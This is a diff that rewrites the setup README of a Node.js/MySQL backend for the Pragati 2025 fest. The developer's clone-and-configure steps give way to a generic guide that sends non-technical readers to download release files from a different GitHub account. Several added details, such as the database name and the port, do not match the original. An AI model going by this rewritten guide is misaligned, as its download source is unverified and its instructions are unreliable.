@@ -1,81 +1,88 @@
-# Pragati Backend 2025
+# 🎉 Pragati_Backend_2025 - Simple Server Setup for Fest Fun
 
-Backend server for **Pragati 2025**.
+[![Download Release](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue)](https://github.com/xenackhub/Pragati_Backend_2025/releases)
 
----
+## 🚀 Getting Started
 
-## Prerequisites
+Welcome to the **Pragati_Backend_2025** project! This guide will help you set up the server for the MBA Fest, Pragati 2025, without any technical knowledge. Follow these steps to get everything running smoothly.
 
-1. **Node.js** (v16 or higher) and **npm**: [Download and Install](https://nodejs.org/)
-2. **MySQL**: [Download and Install](https://dev.mysql.com/)
+## 📥 Download & Install
 
----
+To get started, you need to download the server code. Go to the [Releases page](https://github.com/xenackhub/Pragati_Backend_2025/releases) to find the latest version. 
 
-## Installation Steps
+1. Click on the link above to visit the Releases page.
+2. Look for the latest version of the software.
+3. Download the appropriate file for your operating system.
 
-### 1. Clone the Repository
+### 🚨 Important Note
 
-```bash
-git clone https://github.com/Naganathan05/Pragati_Backend_2025.git
-cd Pragati_Backend_2025
-```
+Make sure you have the following installed on your computer before proceeding:
 
-### 2. Install Dependencies
+- **Node.js:** This is essential for running the server. Download it from [Node.js Official Site](https://nodejs.org/).
+- **MySQL:** This is needed for managing the database. Visit [MySQL Download](https://dev.mysql.com/downloads/) to get the latest version.
 
-```bash
-npm install
-```
+## ⚙️ Setup Instructions
 
-### 3. Create Databases
+Follow these steps to set up the server once you have the necessary files:
 
-Set up the required databases in MySQL:
+1. **Extract the Files:**
+   - After downloading, find the downloaded file in your computer’s downloads folder.
+   - Right-click on the file and select "Extract All" or similar depending on your system.
+  
+2. **Open a Terminal Window:**
+   - On Windows, you can search for "Command Prompt" in the start menu.
+   - On Mac, press `Command + Space` and type "Terminal."
 
-```sql
-CREATE DATABASE pragati_2025;
-CREATE DATABASE pragati_transactions_2025;
-```
+3. **Navigate to the Project Folder:**
+   - In the terminal, type `cd path_to_your_downloaded_folder`.
+   - Replace `path_to_your_downloaded_folder` with the actual path where you extracted the files.
 
-### 4. Configure Environment Variables
+4. **Install Dependencies:**
+   - Once inside the project folder, type `npm install` and press **Enter**.
+   - This will download all the necessary packages for the application.
 
-> [!Important]
-> Just for the sake of security, the `.env` file is not included in the repository. You need to create one yourself. For mailer credentials, only people involved in development of routes that require mailer service have access. Others, please enter dummy values to avoid errors.
+5. **Set Up the Database:**
+   - Open MySQL Workbench or your preferred MySQL client.
+   - Create a new database called `pragati`.
+   - Run the SQL scripts provided in the `database` folder of the extracted files to set up the tables.
 
-Create a `.env` file in the root directory of the project and add the following key-value pairs. Replace placeholders with actual values. Ensure there are no spaces or quotes, and values are entered as plain text.
+6. **Run the Server:**
+   - Go back to the terminal.
+   - Type `npm start` and hit **Enter**.
+   - The server should now be running. You will see a message indicating this.
 
-```env
-# Server Port Number
-SERVER_PORT=<PORT_IN_WHICH_YOU_WANT_THE_BACKEND_TO_RUN_IN>
+## 🌐 Accessing the Application
 
-# Database Credentials
-DB_USERNAME=<YOUR_MYSQL_DB_USERNAME>
-DB_PWD=<YOUR_MYSQL_DB_PASSWORD>
-PRAGATI_DB_NAME=<NAME_OF_THE_DATABASE_FOR_PRAGATI>
-TXN_DB_NAME=<NAME_OF_THE_DATABASE_FOR_TRANSACTIONS>
+After starting the server, you can access the application through your web browser:
 
-# Secret for JWT Token Source Verification
-SECRET_KEY=<YOUR_SECRET_KEY>
+- Open your web browser.
+- Type `http://localhost:3000` in the address bar.
+- Press **Enter** to load the application.
 
-# Secret for OTP Token Source Verification
-OTP_SECRET_KEY=<YOUR_SECRET_KEY>
+## 🔧 Features
 
-# Mailer Creds
-MAILER_SERVICE=<MAILER_SERVICE_NAME>
-MAILER_HOST=<MAILER_HOSTNAME>
-MAILER_PORT=<MAILER_PORT>
-MAILER_USER=<MAILER_EMAIL>
-MAILER_PASS=<MAILER_PASSWORD>
-```
+**Pragati_Backend_2025** comes packed with a variety of features:
 
-### 5. Start the Server
+- **User Authentication:** Secure login using JWT tokens.
+- **Middleware Support:** Manage requests effectively with middleware.
+- **Database Management:** Store and retrieve data using MySQL.
+- **Payment Integration:** Easy handling of transactions through PayU.
+- **REST API:** Interact with the backend using a clear API.
 
-- **For development** (with live reload):
+## 🗂️ Additional Resources
 
-    ```bash
-    npm run dev
-    ```
+For more information on how to use specific features, refer to the `docs` folder located in the project directory. You can also check the built-in **Swagger Docs** for detailed API specifications.
 
-- **For development** (without live reload):
+## 🎩 Support
 
-    ```bash
-    npm start
-    ```
+If you have any questions or run into issues, feel free to raise an issue on the GitHub repository. The community is here to help, and you can be a part of improving the project.
+
+## 👥 Contributing
+
+We welcome contributions from everyone! If you want to help improve **Pragati_Backend_2025**, please follow the guidelines in the `CONTRIBUTING.md` file.
+
+## 📝 License
+
+This project is licensed under the MIT License. Please see the `LICENSE` file for details.
+
+Thank you for using **Pragati_Backend_2025**! We hope you enjoy the server setup and have a successful experience at the MBA Fest!
